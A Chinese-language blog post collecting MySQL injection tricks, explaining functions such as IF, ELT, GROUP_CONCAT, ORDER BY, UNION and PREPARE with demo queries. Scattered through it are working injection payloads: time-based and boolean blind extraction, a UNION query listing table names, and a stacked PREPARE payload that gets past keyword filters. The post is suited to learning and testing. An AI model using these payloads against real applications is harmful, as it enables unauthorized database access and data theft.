---
layout:	post
title:	"SQL注入-一些小trick"
date:	2020-04-10 16:47:23 +0800
tags:	SQL注入
color:	rgb(122,103,138)
cover:	'../assets/blog_pic/20200410_sqli_trick/cover.png'
subtitle:	'SQL注入的小trick'

---

* 目录
{:toc}


通过一些见到的用过的payload，总结一些常见的SQL注入用到的技巧，这样比过一遍SQL所有函数效率高一点吧，等足够多放不下的时候，再想一下怎么分类吧，或者因为懒就一直这样堆着也挺好(●'◡'●)

# 一些解释

## IF(expr1,expr2,expr3)

> 如果expr1是TRUE，则IF()的返回值为expr2；否则返回值为expr3，IF()返回值为数字值或字符串。

```
mysql> select * from vorname;
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Lara    | Zhang     |  20 |
| Patric  | Wang      |  23 |
| Tobias  | Ai        |  22 |
+---------+-----------+-----+
4 rows in set (0.00 sec)

mysql> select if(Alt=22,'yes','no')'22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| yes       |
| no        |
| no        |
| yes       |
+-----------+
4 rows in set (0.00 sec)
```

看别人说**if**就像是开关，也可以说是分流，通过判断决定返回值，感觉很形象啊。

尝试在**if**判断中加入延时，Lina22岁sleep2秒，Tobias22岁，加起来4秒

```
mysql> select if(Alt=22,sleep(2),'not_22')'22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| 0         |
| not_22    |
| not_22    |
| 0         |
+-----------+
4 rows in set (4.00 sec)
```

🤳这里的**22_or_not**是别名

贴一个时间盲注payload来自忘记哪里，判断数据库名称的长度

```
id=2) and if(length(database())=6,sleep(5),null);
```



## IFNULL(expr1,expr2)

**expr1**不为**NULL**，返回值就是**expr1**，否则返回值为**expr2**

```
mysql> select ifnull(1,9);
+-------------+
| ifnull(1,9) |
+-------------+
|           1 |
+-------------+
1 row in set (0.00 sec)
mysql> select ifnull(null,9);
+----------------+
| ifnull(null,9) |
+----------------+
|              9 |
+----------------+
1 row in set (0.00 sec)
```

贴一个时间盲注payload来自忘记哪里

```
id = -2441 OR (ORD(MID((SELECT IFNULL(CAST(FirstName AS CHAR),0x20) FROM user ORDER BY id LIMIT 1,1),2,1))>112)#
```



## ELT(N,str1,str2,...)

如果**N=1**返回**str1**，如果**N=2**返回**str2**，如果参数的数量小于**1**或大于**N**，返回**NULL**

```
mysql> select * from vorname where Vorname='Lina' and elt(1,sleep(1));
Empty set (1.00 sec)

mysql> select * from vorname where Vorname='Lina' and elt(1,sleep(1));
Empty set (0.00 sec)
```

用的时候加上**and短路运算规则**可以进行时间盲注



## FIELD(str,str1,str2,...)

与**ELT**互补，在**str1**，**str2**中寻找**str**，返回找到的下标

```
mysql> select * from vorname where Vorname='Lina' and field(0,sleep(1));
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
+---------+-----------+-----+
1 row in set (1.00 sec)

mysql> select * from vorname where Vorname='Lina' and field(1,sleep(1));
Empty set (1.00 sec)
```

用的时候加上**and短路运算规则**可以进行时间盲注



## 别名

有个优点应该就是，防止列名太长，或可以给未知列名起名字，也就是无列名注入

🤳其中as可以省略

```
mysql> select if(Alt=22,'yes','no') from vorname;
+-----------------------+
| if(Alt=22,'yes','no') |
+-----------------------+
| yes                   |
| no                    |
| no                    |
| yes                   |
+-----------------------+
4 rows in set (0.00 sec)


mysql> select if(Alt=22,'yes','no') as '22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| yes       |
| no        |
| no        |
| yes       |
+-----------+
4 rows in set (0.00 sec)


mysql> select if(Alt=22,'yes','no')'22_or_not' from vorname;
+-----------+
| 22_or_not |
+-----------+
| yes       |
| no        |
| no        |
| yes       |
+-----------+
4 rows in set (0.00 sec)
```

payload来自xray，其中的a是别名

```
id=7'and(select*from(select+sleep(2))a/**/union/**/select+1)='
```

[这个人](https://www.freebuf.com/articles/web/190266.html)很骚，好尝试了别名嵌套

select '1';

select * from(select '1')a;

select * from(select * from(select '1')a)a;......

能套64层w(ﾟДﾟ)w



## CAST

CAST函数用于将某种数据类型的表达式显式转换为另一种数据类型

| Format   | Definition       |
| -------- | ---------------- |
| DATE     | 日期             |
| TIME     | 时间             |
| DATETIME | 日期时间型       |
| DECIMAL  | 浮点数           |
| CHAR     | 字符型，可带参数 |

```
mysql> select cast(12 as decimal);
+---------------------+
| cast(12 as decimal) |
+---------------------+
|                  12 |
+---------------------+
1 row in set (0.00 sec)

mysql> select cast('' as decimal);
+---------------------+
| cast('' as decimal) |
+---------------------+
|                   0 |
+---------------------+
1 row in set, 1 warning (0.00 sec)

mysql> select cast('12' as decimal);
+-----------------------+
| cast('12' as decimal) |
+-----------------------+
|                    12 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select cast(now() as char);
+---------------------+
| cast(now() as char) |
+---------------------+
| 2020-03-26 14:58:35 |
+---------------------+
1 row in set (0.00 sec)

mysql> select cast(database() as char);
+--------------------------+
| cast(database() as char) |
+--------------------------+
| test                     |
+--------------------------+
1 row in set (0.00 sec)
```



## CONCAT&CONCAT_WS&GROUP_CONCAT

| Function                           | Differences                                    |
| ---------------------------------- | ---------------------------------------------- |
| concat(str1,str2,...)              | 没有分隔符地连接字符串                         |
| concat_ws(separator,str1,str2,...) | 含有分隔符地连接字符串                         |
| group_concat(str1,str2,...)        | 连接一个组的所有字符串，并以逗号分隔每一条数据 |

### CONCAT

没有分隔符地连接字符串

```
mysql> select concat(Vorname,'~',Nachname) from vorname;
+------------------------------+
| concat(Vorname,'~',Nachname) |
+------------------------------+
| Lina~Schneider               |
| Lara~Zhang                   |
| Patric~Wang                  |
| Tobias~Ai                    |
+------------------------------+
4 rows in set (0.00 sec)
```

### CONCAT_WS

含有分隔符地连接字符串

```
mysql> select concat_ws('~',Vorname,Alt) from vorname;
+----------------------------+
| concat_ws('~',Vorname,Alt) |
+----------------------------+
| Lina~22                    |
| Lara~20                    |
| Patric~23                  |
| Tobias~22                  |
+----------------------------+
4 rows in set (0.00 sec)

mysql> select concat_ws('~',Vorname,Nachname,Alt) from vorname;
+-------------------------------------+
| concat_ws('~',Vorname,Nachname,Alt) |
+-------------------------------------+
| Lina~Schneider~22                   |
| Lara~Zhang~20                       |
| Patric~Wang~23                      |
| Tobias~Ai~22                        |
+-------------------------------------+
4 rows in set (0.00 sec)
```

### GROUP_CONCAT

```
mysql> select group_concat(Vorname,'~',Nachname),Alt from vorname group by Alt;
+------------------------------------+-----+
| group_concat(Vorname,'~',Nachname) | Alt |
+------------------------------------+-----+
| Lara~Zhang                         |  20 |
| Lina~Schneider,Tobias~Ai           |  22 |
| Patric~Wang                        |  23 |
+------------------------------------+-----+
3 rows in set (0.00 sec)
```

常见的union联合查询注入语句，读取当前数据库的所有表名

```
id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

### GROUP_CONCAT+CONCAT_WS

```
mysql> select group_concat(concat_ws('~',Vorname,Nachname)order by Nachname),Alt from vorname group by Alt;
+----------------------------------------------------------------+-----+
| group_concat(concat_ws('~',Vorname,Nachname)order by Nachname) | Alt |
+----------------------------------------------------------------+-----+
| Lara~Zhang                                                     |  20 |
| Tobias~Ai,Lina~Schneider                                       |  22 |
| Patric~Wang                                                    |  23 |
+----------------------------------------------------------------+-----+
3 rows in set (0.00 sec)
```



## ORDER BY

sql注入的教程里经常第一步是**order by**，好多地方会叫**显示位**，那原理是什么呢？

效果如下，如果数据表一共有3列，当**order by 4**时，提示没有第四列

```
mysql> select * from vorname where Alt=22 order by 1;   
+---------+-----------+-----+                           
| Vorname | Nachname  | Alt |                           
+---------+-----------+-----+                           
| Lina    | Schneider |  22 |                           
| Tobias  | Ai        |  22 |                           
+---------+-----------+-----+                           
2 rows in set (0.00 sec)  

mysql> select * from vorname where Alt=22 order by 2;   
+---------+-----------+-----+                           
| Vorname | Nachname  | Alt |                           
+---------+-----------+-----+                           
| Tobias  | Ai        |  22 |                           
| Lina    | Schneider |  22 |                           
+---------+-----------+-----+                           
2 rows in set (0.00 sec)                                
                                                        
mysql> select * from vorname where Alt=22 order by 3;   
+---------+-----------+-----+                           
| Vorname | Nachname  | Alt |                           
+---------+-----------+-----+                           
| Lina    | Schneider |  22 |                           
| Tobias  | Ai        |  22 |                           
+---------+-----------+-----+                           
2 rows in set (0.00 sec)                                
                                                        
mysql> select * from vorname where Alt=22 order by 4;   
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
```

**order by**原理是排序，**order by 1**就是以第一列排序，Lina在Tobias之前，**order by 2**是以第二列排序，Ai在Schneider之前，**order by 4**就出错辣，因为没有第四列。因此在注入的第一步可以用来判断表的列数，这个也为大多数sql注入的后一步做铺垫，因为UNION语句需要前后两个的列数相同。



## UNION

前面说UNION语句需要前后两个的列数相同，效果如下，只有union前后为相同的列数，才不会出错

```
mysql> select * from vorname where Alt=22 union select 1;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select * from vorname where Alt=22 union select 1,2;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
mysql> select * from vorname where Alt=22 union select 1,2,3;
+---------+-----------+-----+
| Vorname | Nachname  | Alt |
+---------+-----------+-----+
| Lina    | Schneider |  22 |
| Tobias  | Ai        |  22 |
| 1       | 2         |   3 |
+---------+-----------+-----+
3 rows in set (0.00 sec)
```

在union后一段中的第三列获取该数据库的用户名

```
mysql> select * from vorname where Alt=22 union select 1,2,user();
+---------+-----------+----------------+
| Vorname | Nachname  | Alt            |
+---------+-----------+----------------+
| Lina    | Schneider | 22             |
| Tobias  | Ai        | 22             |
| 1       | 2         | root@localhost |
+---------+-----------+----------------+
3 rows in set (0.00 sec)
```



## PREPARE

MYSQL的预处理语句由PREPARE、EXECUTE、DEALLOCATE组成

**语法**

```
PREPARE stmt_name FROM preparable_stmt

EXECUTE stmt_name [USING @var_name [,@var_name]...]

{DEALLOCATE|DROP} PREPARE stmt_name
```

**实例**

```
mysql> prepare pr1 from 'select ?+?';
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> set @a=1,@b=10;
Query OK, 0 rows affected (0.00 sec)

mysql> execute pr1 using @a,@b;
+------+
| ?+?  |
+------+
|   11 |
+------+
1 row in set (0.00 sec)

mysql> execute pr1 using @a,@a;
+------+
| ?+?  |
+------+
|    2 |
+------+
1 row in set (0.00 sec)

mysql> execute pr1 using 1,2;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1,2' at line 1

mysql> deallocate prepare pr1;
Query OK, 0 rows affected (0.00 sec)
```

过程大致如上，👌准备一条语句，命名为**pr1**，内容为**‘select ?+?’**，**‘select ?+?’**里的**？**是用来占位的。设置变量**a**和**b**；👌**execute**来执行命名为**pr1**的语句，使用变量**a**和**b**，不可以是**1**和**2**这样的数字；👌**deallocate**释放执行中使用的数据库资源

**意义**

✍可以减少每次执行SQL语法分析，比如

```
PREPARE stmt1 FROM 'SELECT productCode, productName
                    FROM products
                    WHERE productCode = ?';
```

之后只需要**set**不同的**productCode**值，再**execute**

✍可以在关键词被过滤的时候拼接关键词进行绕过，比如看到的一个可以堆叠注入的payload

```
1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
```

✍防止SQL注入（关于问号占位符可以防止注入的事情，有搜出来好多东西，有空再整理学习一下（吗









# Refer

[https://xz.aliyun.com/t/5505](shenmedoumeiyou)

[https://www.k0rz3n.com/2019/02/21/一篇文章带你深入理解 SQL 盲注/](dianjibunengtiaozhuan)